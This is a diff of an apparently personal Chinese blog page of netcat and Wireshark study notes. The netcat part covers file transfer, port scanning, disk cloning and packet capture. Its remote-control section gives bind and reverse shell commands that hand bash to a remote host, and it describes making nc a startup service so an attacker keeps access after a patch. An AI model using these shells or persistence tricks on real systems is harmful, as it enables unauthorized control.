@@ -8,7 +8,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://kite-007.github.io/favicon.ico?v=1617547278428">
+<link rel="shortcut icon" href="https://kite-007.github.io/favicon.ico?v=1621251676600">
 <link rel="stylesheet" href="https://kite-007.github.io/styles/main.css">
 
 
@@ -19,22 +19,21 @@
 
 
     <meta name="description" content="
-1. NETCAT-NC
+NETCAT-NC
 
+0. 介绍
 1. telnet
 2. 传输文本信息
 3. 传输文件，目录
 4. 加密传输文件
-5. 远程控制，木马
-6. 加密所有流量
-7. 流媒体服务器
-8. 远程克隆硬盘
+5. 流媒体服务器
+6. 端口扫描
+7. 远程克隆硬盘，内存
+8. 远程控制
+9. 加密所有流量
 
 
 WIRESHARK
-
-介绍
-启动试着抓取
 ..." />
     <meta name="keywords" content="wireshark,kali,工具" />
   </head>
@@ -45,7 +44,7 @@ WIRESHARK
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://kite-007.github.io">
-        <img src="https://kite-007.github.io/images/avatar.png?v=1617547278428" class="site-logo">
+        <img src="https://kite-007.github.io/images/avatar.png?v=1621251676600" class="site-logo">
         <h1 class="site-title">Fr</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -100,37 +99,52 @@ WIRESHARK
             
             <div class="post-content" v-pre>
               <p><ul class="markdownIt-TOC">
-<li><a href="#1-netcat-nc">1. NETCAT-NC</a>
+<li><a href="#netcat-nc">NETCAT-NC</a>
 <ul>
+<li><a href="#0-%E4%BB%8B%E7%BB%8D">0. 介绍</a></li>
 <li><a href="#1-telnet">1. telnet</a></li>
 <li><a href="#2-%E4%BC%A0%E8%BE%93%E6%96%87%E6%9C%AC%E4%BF%A1%E6%81%AF">2. 传输文本信息</a></li>
 <li><a href="#3-%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95">3. 传输文件，目录</a></li>
 <li><a href="#4-%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6">4. 加密传输文件</a></li>
-<li><a href="#5-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E6%9C%A8%E9%A9%AC">5. 远程控制，木马</a></li>
-<li><a href="#6-%E5%8A%A0%E5%AF%86%E6%89%80%E6%9C%89%E6%B5%81%E9%87%8F">6. 加密所有流量</a></li>
-<li><a href="#7-%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1%E5%99%A8">7. 流媒体服务器</a></li>
-<li><a href="#8-%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98">8. 远程克隆硬盘</a></li>
+<li><a href="#5-%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1%E5%99%A8">5. 流媒体服务器</a></li>
+<li><a href="#6-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">6. 端口扫描</a></li>
+<li><a href="#7-%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98%E5%86%85%E5%AD%98">7. 远程克隆硬盘，内存</a></li>
+<li><a href="#8-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6">8. 远程控制</a></li>
+<li><a href="#9-%E5%8A%A0%E5%AF%86%E6%89%80%E6%9C%89%E6%B5%81%E9%87%8F">9. 加密所有流量</a></li>
 </ul>
 </li>
 <li><a href="#wireshark">WIRESHARK</a>
 <ul>
 <li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
 <li><a href="#%E5%90%AF%E5%8A%A8%E8%AF%95%E7%9D%80%E6%8A%93%E5%8F%96">启动试着抓取</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E7%BB%9F%E8%AE%A1">信息统计</a></li>
+<li><a href="#%E5%AE%9E%E8%B7%B5">实践</a></li>
 </ul>
 </li>
 </ul>
 (基本工具)</p>
-<h1 id="1-netcat-nc">1. NETCAT-NC</h1>
+<h1 id="netcat-nc">NETCAT-NC</h1>
+<h2 id="0-介绍">0. 介绍</h2>
+<p>        在网络中的外号是瑞士军刀，身材小巧，能力非凡。</p>
+<ul>
+<li>充当telnet。我们通常在win下面会使用telnet，去连接别人的端口（23，25等）对其发送一些指令，或者获取到一些信息。但是有了nc之后就可以舍弃掉telnet了，更加强大，更加稳定，可以完成telnet所有可以完成的工作。</li>
+<li>传输文本信息。eg：可以将其当作一种聊天工具。</li>
+<li>传输文件目录。作为文件服务器，或者是ftp服务器。</li>
+<li>加密传输文件。利用系统的加密特性结合来实现加密的传输文件的功能，默认情况下，nc传输文件是不加密的。</li>
+<li>远程控制。某种意义上来说可以作为一种木马来使用，可以远程控制某个服务器，虽然是个命令行工具，但是也可以完全控制目标服务器，而且所有的杀毒软件不会将nc当作病毒查杀，非常理想的远程控制器。</li>
+<li>加密所有数据流量。</li>
+<li>流媒体服务器。像网络上的视频服务器，都是基于流的一个流媒体，nc也可以作为一个流媒体服务器，当然，流媒体的服务器客户端，nc都可以来做，</li>
+<li>远程克隆硬盘。（电子取证）<br>
+<br></li>
+</ul>
 <pre><code># 查看帮助信息，可用参数
 nc -h
 
 # 显示详细的连接的相关信息，输出内容
 nc -v
 
-# 如果后面紧跟域名，则不会进行dns解析，因为一般解析dns比较慢，所以需要提前把域名解析，直接将IP交予nc使用
+# 后面紧跟IP地址，如果后面紧跟域名，则不会进行dns解析，因为一般解析dns比较慢，所以需要提前把域名解析，直接将IP交予nc使用
 nc -n
-
-nc -nv 1.1.1.1 44
 
 # 指定端口号
 nc -p 4444
@@ -139,23 +153,324 @@ nc -p 4444
 <ul>
 <li>NC——TELNET / BANNER
 <ul>
-<li>
-<p>能够连接目标端口，发送指令，连接对方服务</p>
-</li>
-<li></li>
-</ul>
-</li>
-</ul>
-<h2 id="2-传输文本信息">2. 传输文本信息</h2>
-<h2 id="3-传输文件目录">3. 传输文件，目录</h2>
-<h2 id="4-加密传输文件">4. 加密传输文件</h2>
-<h2 id="5-远程控制木马">5. 远程控制，木马</h2>
+<li>能够连接目标端口，发送指令，连接对方服务
 <ul>
-<li>杀毒软件不会查杀</li>
+<li>比如现在有一个邮件服务器，NC能够连接SMTP端口或TOP3端口，以及有一个网站的话，他能够链接该网站的80端口，或者是能够作为客户端使用（连接其他服务器的服务端口，对服务端口发送指令进行探测），也能作为服务端使用。</li>
+<li>eg1:(使用nc连接邮件服务器，可以用来接收邮件)
+<ul>
+<li>ping pop3.163.com ，# 解析得到该域名的相关IP地址，以及对应的端口</li>
+<li>nc -vn 123.126.97.79 110 ，# pop3所走的端口是110端口，作为客户端连接服务器的端口的最基本命令
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617629786150.png" alt="" loading="lazy"></li>
+<li>这里我们看到了nc第一个作用：通过连接到对方服务器能过得到服务器的banner信息，发现：110端口是打开的，同时服务器返回了一个welcome，通过welcome可以得到163所用的邮件服务器用的是coremail，通过coremail来实现他的邮件服务，连接上可以在当前的命令上面做一些命令的输入。</li>
+<li><img src="https://kite-007.github.io/post-images/1617630308494.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617630772497.png" alt="" loading="lazy"></li>
 </ul>
-<h2 id="6-加密所有流量">6. 加密所有流量</h2>
-<h2 id="7-流媒体服务器">7. 流媒体服务器</h2>
-<h2 id="8-远程克隆硬盘">8. 远程克隆硬盘</h2>
+<hr>
+<ul>
+<li>试着smtp，端口号是25</li>
+<li><img src="https://kite-007.github.io/post-images/1617631049241.png" alt="" loading="lazy"></li>
+<li>Anti-spam GT一个反垃圾邮件的GT版本</li>
+</ul>
+<hr>
+</li>
+</ul>
+</li>
+<li>eg2:(使用nc连接Web服务器，请求页面)
+<ul>
+<li>如果对方有http服务器，可以直接连接对方的80端口，这里打开Metasploitable2，上面有Web服务。</li>
+<li><img src="https://kite-007.github.io/post-images/1617675952113.png" alt="" loading="lazy"></li>
+<li>通过敲击命令可以将对方的网页信息请求过来。</li>
+<li><img src="https://kite-007.github.io/post-images/1617675959776.png" alt="" loading="lazy"></li>
+</ul>
+</li>
+<li>演示：
+<ul>
+<li>QQ邮箱POP3端口 QQ邮箱接收邮件服务器： pop.qq.com ，使用SSL，端口号995 QQ邮箱POP3的端口号995,SMTP的端口号是465或587。</li>
+<li>为了保障用户邮箱的安全，QQ邮箱设置了POP3/SMTP/IMAP的开关。系统缺省设置是“关闭”，在用户需要这些功能时请“开启”才可以用客户端软件收发邮件。</li>
+<li><img src="https://kite-007.github.io/post-images/1617675002280.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617675007033.png" alt="" loading="lazy"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>
+</code></pre>
+<h2 id="2-传输文本信息">2. 传输文本信息</h2>
+<ul>
+<li>能够实现传输文本信息的功能，这里以聊天的功能举例。</li>
+<li>聊天功能需要用到两个机子，一个做为服务器，一个做为客户机，两个主机进行通信。
+<ul>
+<li>eg：（聊天功能）
+<ul>
+<li>首先需要一台服务器开放一个端口，侦听一个端口，之后另外一个做为客户端对端口进行连接，连接之后，两个机子会产生一个TCP连接，之后默认情况下可以进行为本信息的传递。</li>
+<li>nc -l -p 4444（服务端）
+<ul>
+<li>-l，告诉nc要打开侦听一个端口</li>
+<li>-p，指定端口号</li>
+</ul>
+</li>
+<li>nc -nv 1.1.1.1 4444（客户端）</li>
+<li><img src="https://kite-007.github.io/post-images/1617676711717.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617676721513.png" alt="" loading="lazy"></li>
+<li>首先服务端使用nc打开主机上面一个侦听端口，然后客户端也使用nc通过IP和这个打开的端口去连接这个服务器，连接之后输入文本信息，服务端可以接收到。</li>
+</ul>
+<hr>
+<ul>
+<li>netstat -pantu | grep 4444</li>
+<li><img src="https://kite-007.github.io/post-images/1617676981719.png" alt="" loading="lazy"></li>
+<li>这个命令可以用来查看服务端要打开的端口是否开放着。</li>
+<li>连接在一端终止，两端都会终止。</li>
+</ul>
+<hr>
+</li>
+<li>聊天和渗透测试有什么关系。
+<ul>
+<li>用文本信息来传输，在电子取证这里有一个典型的应用场景。</li>
+<li>电子取证的原则：取证的过程中，尽量少的或者完全不会对取证的目标机的计算文件里面的内容做出改变。如果做出了改变，就有可能改变了硬盘扇区，造成原来硬盘上面已经被删除的内容无法被恢复的情况。
+<ul>
+<li>eg：
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617677885076.png" alt="" loading="lazy"></li>
+<li>主机先打开一个端口。</li>
+</ul>
+<hr>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617678033080.png" alt="" loading="lazy"></li>
+<li>利用管道命令发送要取证的内容。</li>
+</ul>
+<hr>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617678082063.png" alt="" loading="lazy"></li>
+<li>收到取证信息。</li>
+</ul>
+<hr>
+<ul>
+<li>如果收取到的信息比较多的话，可以将他先保存到一个文件里面，只需在服务端的指令稍加修改就可以。</li>
+<li>nc -l -p 4444 &gt; nc.txt</li>
+</ul>
+<hr>
+<ul>
+<li>查看进程中是否存在可疑的信息。</li>
+<li><img src="https://kite-007.github.io/post-images/1617678571781.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617678614587.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ul>
+<li>ps aux | nc -nv 192.168.200.147 4444 -q 1</li>
+<li>-q：标准的结果输出完成之后，等待几秒钟之后自动退出，如果不加这个命令，就无法判断当前的信息是否发送完成，nc会一直处于连接状态，如果加了-q的命令，nc传输完成之后就会自动断开连接。</li>
+</ul>
+<hr>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-传输文件目录">3. 传输文件，目录</h2>
+<ol>
+<li>传输文件
+<ul>
+<li>A作为接收端，先打开端口(接收端或者发送端都可以)，A先打开一个端口指定，将接收的文件保存到1.MP4，B发送端连接端口，用小于号将要传送的文件输入到nc连接远端的端口。</li>
+<li>原理：端口的重定向。</li>
+<li>在发送端使用-q才会断开连接。</li>
+</ul>
+</li>
+</ol>
+<pre><code>A：nc -lp 333 &gt; 1.mp4
+B：nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1
+• 或
+A：nc -q 1 -lp 333 &lt; a.mp4
+B： nc -nv 1.1.1.1 333 &gt; 2.mp4
+</code></pre>
+<hr>
+<ul>
+<li>方式一：A做接收端
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617782905823.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617782911820.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617782917888.png" alt="" loading="lazy"></li>
+<li>先将ps.txt在A上面删去，再在B上面将ps.txt传送到A上面去，形象一点，A只要接收到内容，就会将该内容保存到一个文件，或者可以说发送端一旦连接A，只要发送了内容，就会在A端生成一个文件，无论接收到的是什么。</li>
+<li>第一种方式下在后端加上-q 1发送完毕之后会自动断开连接</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li>方式二：A做发送端
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617782702401.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617782707036.png" alt="" loading="lazy"></li>
+<li>A要发送ps.txt，B接收ps.txt，形象一点，就是将ps.txt放入该A的连接端口，只要谁来连接端口，那麽这个文件就会从这个端口流入到对方的电脑，并输出。</li>
+<li>第二种方式下在后端加上-q 1发送完毕之后不会断开连接</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ol start="2">
+<li>传输目录
+<ul>
+<li>传输目录其实并不是nc本身的功能，他还需要配合其他的命令使用。</li>
+<li>在A上创建一个目录ps，将ps.txt放入该目录传送到B端。</li>
+<li>思路：先将该要发送的文件目录打包，之后打包成一个文件，文件通过管道把他发送到nc的一个端口里面，之后在目录的接收端先用nc连接发送端打开的端口，连接之后打包好的目录就流到了接收端，在接收端再通过管道，把接收到的打包文件进行解包，重新还原成目录进行传输。</li>
+<li>传输时也涉及到正向反向，就是文件传输的两种方式，以下使用一种方式。</li>
+</ul>
+</li>
+</ol>
+<pre><code>A：tar -cvf - ps/ | nc -lp 333 –q 1
+B：nc -nv 1.1.1.1 333 | tar -xvf - ps
+</code></pre>
+<hr>
+<ul>
+<li>演示：
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617791140944.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617791145577.png" alt="" loading="lazy"></li>
+<li>B端接收到了文件，连接自动断开，注意空格和横线。</li>
+<li>A端先进行打包，再通过管道进行传送，B端接收到打包文件进行解包，得到还原的目录文件，也可以使用传送文件的方式进行传输。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="4-加密传输文件">4. 加密传输文件</h2>
+<ul>
+<li>思路与传送目录的思路相似。</li>
+<li>也是通过加密指令，把一个文件先进行加密，生成一个加密文件，再把这个加密文件作为输入结果输入到nc的命令里面去，之后再由nc的命令实现双方的传递。</li>
+<li>加密传文件与传输目录的顺序(方向)有所发生变化。在接收端A端，先nc侦听一个端口，端口等待传入文件，当B把文件进行加密并与A建立连接传入文件之后，A把端口传入的文件作为下一个命令的输入，也就是接收后传入到解密命令中去，解密之后再把文件输出出来。</li>
+</ul>
+<pre><code>A：nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4
+B： mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1
+</code></pre>
+<ul>
+<li>mcrypt：加解密操作，KALI默认没有安装。</li>
+<li>-Fbqd：解密，需要密码。</li>
+<li>-Fdq：加密，需要密码。</li>
+<li>rijndael-256：加解密算法，256的密钥，解密完成之后密钥就会被flush掉，不会在本地进行保存。</li>
+</ul>
+<hr>
+<ul>
+<li>演示：
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617884704863.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617884712348.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617884719247.png" alt="" loading="lazy"></li>
+<li>A端先打开端口，确认是否输入正确，之后等待。</li>
+<li>B端传入文件回车之后需要输入两次密码，输入密码之后，退出链接。</li>
+<li>A端出现提示输入密码的信息，输入正确密码之后，接收到文件退出链接。</li>
+</ul>
+</li>
+</ul>
+<h2 id="5-流媒体服务器">5. 流媒体服务器</h2>
+<ul>
+<li>nc可以作为流媒体服务器，先需要一个流媒体的服务器端，之后再有一个流媒体的客户端。</li>
+<li>服务器端为A，客户端为B。</li>
+<li>cat 用来查看文本也可以用来查看文件，cat之后输出，作为下一个命令的输入，nc侦听端口，之后将MP4的文件输入到333端口里面去。</li>
+<li>B端连接流媒体服务器A，B端一旦和A端建立连接之后，那麽从A端333端口流入的文件就会流入B端，之后B端就会把接收到的视频流通过管道输出给媒体播放器，让媒体播放器去播放内容。</li>
+<li>mplayer KALI默认没有安装，指定了缓存大小。</li>
+</ul>
+<pre><code>A： cat 1.mp4 | nc -lp 333 
+B： nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -
+</code></pre>
+<hr>
+<h2 id="6-端口扫描">6. 端口扫描</h2>
+<ul>
+<li>nc以客户端的形式来作为一个扫描器，默认情况下nc以tcp协议进行探测，也是探测1-65535的tcp端口是否开放，因为默认是tcp，假如现在要探测udp呢？就在这之后加参数-u。</li>
+<li>-z：扫描模式，探测相应的端口，不会做后续的io的输入输出交换。</li>
+</ul>
+<pre><code>nc -nvz 1.1.1.1 1-65535 
+nc -vnzu 1.1.1.1 1-1024
+</code></pre>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617888793661.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617888800907.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<h2 id="7-远程克隆硬盘内存">7. 远程克隆硬盘，内存</h2>
+<ul>
+<li>远程电⼦取证的第一步，在进行电子取证之前需要现将目标的内存，硬盘做一个完整的备份，不仅仅只是把文件里的内容拷贝，还包括可以恢复的数据文件。可以将目标服务器硬盘远程复制。有了备份之后就可以进行破坏性分析。</li>
+<li>内存中可能会用运行中的木马程序，僵尸程序等待，这些在服务器关机之后就会丢失。</li>
+<li>硬盘的工作原理：通过磁头的指针，磁化磁盘表面上的每个扇区里面的每个数据位的磁头，正向表示为1反向表示为0，通过这种方式将0，1记录进去。当把一个文件存进去，就相当于磁头磁化了一部分扇区里的磁头的方向。</li>
+<li>平常使用的话：对操作系统下达指令，要删除某个文件，操作系统不会让磁针把磁盘上面有关于这个文件的磁头全部初始化，他只会把文件名的第一个首字母标记，标记&quot;文件已经被删除了&quot;，文件目录列表里面不会出现，但是这个文件实际上的每一个块，每一个扇区，每一个磁道，每一个位，里面的数据基本上是完整的存在于磁盘里面的，所以有的删除的文件是可以进行还原的，如果新进来了文件，这些可以被还原的文件就可能被覆盖了，无法再被还原。</li>
+</ul>
+<pre><code>A： nc -lp 333 | dd of=/dev/sda 
+B： dd if=/dev/sda | nc -nv 1.1.1.1 333 –q 1 
+</code></pre>
+<ul>
+<li>B：作为被取证电脑，把硬盘作为一个输入结果管道输出给nc，nc连接接收端电脑ip，发送完成之后断开连接。</li>
+<li>A：接收端，在A端挂载硬盘，通常不是sda。侦听端口，侦听从B端传出来的内容，管道给dd，输出到另外一块硬盘作为流的输出。</li>
+<li>if：input file</li>
+<li>of：output file</li>
+</ul>
+<hr>
+<ul>
+<li>这里需要做一个硬盘容量比较小的虚拟机进行尝试。</li>
+</ul>
+<hr>
+<h2 id="8-远程控制">8. 远程控制</h2>
+<ul>
+<li>一台windows的服务器要实现远程控制，通常要打开远程控制，首先要打开3389端口，然后管理员可以在另外一个地方连到机房里打开的端口的服务器上，在对它进行远程控制远程管理，这样管理员就不用每天在机房里进行服务器的配置，效率比较高，方便。windows通常会使用一些远程管理的工具。linux通常是xshell，在一定程度上可以代替ssh。</li>
+<li>类似于QQ的远程协助。</li>
+</ul>
+<pre><code>正向：
+• A：nc -lp 333 -c bash
+• B：nc -nv 1.1.1.1 333
+B控制A
+
+反向：
+• A：nc -lp 333
+• B：nc -nv 1.1.1.1 333 -c bash
+
+# 注：Windows⽤户把bash改成cmd；
+</code></pre>
+<p>*正向：<br>
+* <img src="https://kite-007.github.io/post-images/1617969110798.png" alt="" loading="lazy"><br>
+* B获得了A的控制权，取得的是目前A所拥有的控制权。<br>
+* 正向shell：A作为服务端，侦听一个端口，通过B作为客户端来连接这个端口，之后服务器A把自己的bash传给客户端。</p>
+<hr>
+<ul>
+<li>反向：
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617970718384.png" alt="" loading="lazy"></li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li>比如现在A有一个漏洞，B通过A的这个漏洞短暂地拿到了这个服务器的shell，如果这个漏洞近期就要被修复了，那么就不能够在利用这个漏洞进入服务器A并拿取shell。这时就可以通过nc在两台主机保持连接，继续实现远程控制，即使所有的漏洞已经被修复了。甚至可以把nc写成一个启动脚本，放入etc/目录下的init.b的目录下，运行系统启动时的配置命令，update -rc.d，把nc写成的这个脚本当作一个系统服务，每次A重启之后他就会自动地去侦听B的端口。（条件：被攻击的服务器的端口与攻击者的端口可以相互远程连接，条件比较苛刻，因为一般的服务器只会打开特定的端口，而从外部向内部进行访问不经过这些特定的端口则都会被禁止掉，这时，就可以试试反向连接）</li>
+<li>在攻击端侦听一个端口，在被攻击端的服务器上面通过启动脚本，每一次重启的时候，被攻击端的服务器会主动的连接攻击者的IP地址，主动地送上shell，比较容易实现。因为一般服务器不会禁止掉从内向外发送的请求，另外一些的可能性也存在。</li>
+</ul>
+<hr>
+<h2 id="9-加密所有流量">9. 加密所有流量</h2>
+<ul>
+<li>nc缺点：没有流量加密，容易被嗅探，ARP攻击等等。没有身份验证的能力，无法判断，无论谁都能链接这个打开了的端口。</li>
+<li>Ncat可以弥补这些缺点，Ncat包含于nmap工具包中。</li>
+</ul>
+<pre><code>• Nc缺乏加密和⾝份验证的能⼒
+• Ncat包含于nmap⼯具包中
+• A：ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl 
+• B：ncat -nv 1.1.1.1 333 --ssl
+
+--allow：允许哪个ip地址来连接
+--ssl：管道是加密方式的链接
+-vnl：指定端口
+</code></pre>
+<hr>
+<ul>
+<li>管道加密演示：
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617973437553.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617973823381.png" alt="" loading="lazy"></li>
+<li>两个通过ncat命令链接，在管道中传输的文件也会被加密。</li>
+<li>ncat可以完成nc的所有功能。</li>
+</ul>
+</li>
+</ul>
+<hr>
 <h1 id="wireshark">WIRESHARK</h1>
 <h2 id="介绍">介绍</h2>
 <ol>
@@ -185,27 +500,101 @@ wireshark
 </ol>
 <ul>
 <li>笔记本一般会有以太网网卡，有线网卡，无线网卡。服务器一般会有多个网卡。这里要指定抓取哪个网卡上面的数据包，这里选择以太网网卡eth0。</li>
-<li><img src="https://kite-007.github.io/post-images/1617542012985.png" alt="" loading="lazy"><br>
-<br></li>
-<li>其他机器里的广播流量包或者一些其他的单通数据包(混杂模式)经过kali机器，那麽流量包就会被抓取下来。</li>
-<li><img src="https://kite-007.github.io/post-images/1617542610555.png" alt="" loading="lazy"><br>
-<br></li>
-<li>设置过滤器，开启混杂模式时一定得过滤掉不需要的，这里可以进行选择，选择之后在方框中可以进行修改，像抓取单个机器，只抓arp包，只抓ip包，抓取端口等等。</li>
-<li><img src="https://kite-007.github.io/post-images/1617543056124.png" alt="" loading="lazy"><br>
-<br></li>
-<li>抓取我打开的一台机器192.168.200.142的包</li>
-<li><img src="https://kite-007.github.io/post-images/1617543442471.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1617545465580.png" alt="" loading="lazy"><br>
-<br></li>
-<li>抓取的包可以进行保存，保存的文件类型也可以另存为可以兼容其他工具的类型，通常pcap兼容性比较好，有gzip选项可以进行压缩。</li>
-<li><img src="https://kite-007.github.io/post-images/1617544118866.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1617544432352.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1617545053020.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1617545113241.png" alt="" loading="lazy"></li>
-<li><img src="https://kite-007.github.io/post-images/1617545301247.png" alt="" loading="lazy"><br>
-<br></li>
-<li>首选项里可以更改界面字体等。</li>
+<li><img src="https://kite-007.github.io/post-images/1617603171642.png" alt="" loading="lazy"></li>
 </ul>
+<hr>
+<ul>
+<li>其他机器里的广播流量包或者一些其他的单通数据包(混杂模式)经过kali机器，那麽流量包就会被抓取下来。</li>
+<li><img src="https://kite-007.github.io/post-images/1617603200042.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ul>
+<li>设置过滤器，开启混杂模式时一定得过滤掉不需要的，这里可以进行选择，选择之后在方框中可以进行修改，像抓取单个机器，只抓arp包，只抓ip包，抓取端口等等。</li>
+<li><img src="https://kite-007.github.io/post-images/1617603302214.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ul>
+<li>抓取我打开的一台机器192.168.200.142的包</li>
+<li><img src="https://kite-007.github.io/post-images/1617545465580.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ul>
+<li>抓取的包可以进行保存，保存的文件类型也可以另存为可以兼容其他工具的类型，通常pcap兼容性比较好，有gzip选项可以进行压缩。</li>
+<li><img src="https://kite-007.github.io/post-images/1617603431690.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617603460056.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ul>
+<li>首选项里可以更改界面字体等。</li>
+<li><img src="https://kite-007.github.io/post-images/1617603573075.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617603593674.png" alt="" loading="lazy"><br>
+<br></li>
+</ul>
+<h2 id="信息统计">信息统计</h2>
+<ul>
+<li>英文是Statistics（统计）里面可以查看统计信息，进一步收取信息来查看网络里当前的状态，发现安全问题。</li>
+</ul>
+<ol>
+<li>Summary（捕获文件属性），文件属性，从中可以查看珠宝文件的摘要信息：时间，接口，抓取多少个包，报的情况如何等等。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617602784055.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617602789019.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="2">
+<li>Endpoins（），节点数，查看各种所抓取的协议的地址数量，也可以根据发送的数据包，接收到的数据包进行一个排序。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617605458382.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617605466853.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617605485848.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="3">
+<li>Protocol Hierarchy（协议分级统计），协议分布，可以查看各种重要的协议信息数据，了解到当前抓取的数据包的协议类型，都是什么样的数据包。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617605302169.png" alt="" loading="lazy"></li>
+<li><img src="https://kite-007.github.io/post-images/1617605334853.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="4">
+<li>Packet Lengths（分组长度），包大小分布，查看网络里面是占比大包数据流量的多，还是小包数据流量的多，如果是以小包数据流量占比偏多的话，网络的性能可能会比较差，另外有许多的网络攻击就是以小包的形式来的。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617606056570.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="5">
+<li>Conversations（），会话连接，所表示的意思为会话，就是可以看出那两个机器之间产生了数据流量的交互。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617606708094.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="6">
+<li>解码方式</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617609881814.png" alt="" loading="lazy"></li>
+<li>查看数据流量包在80端口按照HTTP解析下来，它的内容是否为HTTP的指令，如果不是就可以进行更改，右击单个数据流量包，选择Decode As...可以更改。</li>
+<li><img src="https://kite-007.github.io/post-images/1617610200018.png" alt="" loading="lazy"></li>
+</ul>
+<hr>
+<ol start="7">
+<li>另外一个比较重要的是专家信息，在Analyze（分析）中，选择专家信息。</li>
+</ol>
+<ul>
+<li><img src="https://kite-007.github.io/post-images/1617610719654.png" alt="" loading="lazy"></li>
+<li>它是衡量一个抓包软件好与坏的一个重要的信息，专家信息如果功能丰富以及自动分析能力强的话，会给使用者带来巨大的便利。</li>
+<li>比如，现在的网络有两个不同的MAC地址在发送ARP包，都在声称自己是网关的IP地址，如果这些包被wireshark抓取下来，进行分析就会得出网络里面网络里面正在发生着ARP欺骗，因为有两个不同的MAC地址正在发送着相同的网关IP，声称自己是相同的网关IP。</li>
+<li>所以专家系统有时候会给我们一个提示，告诉我们网络中存在着哪些问题。</li>
+</ul>
+<hr>
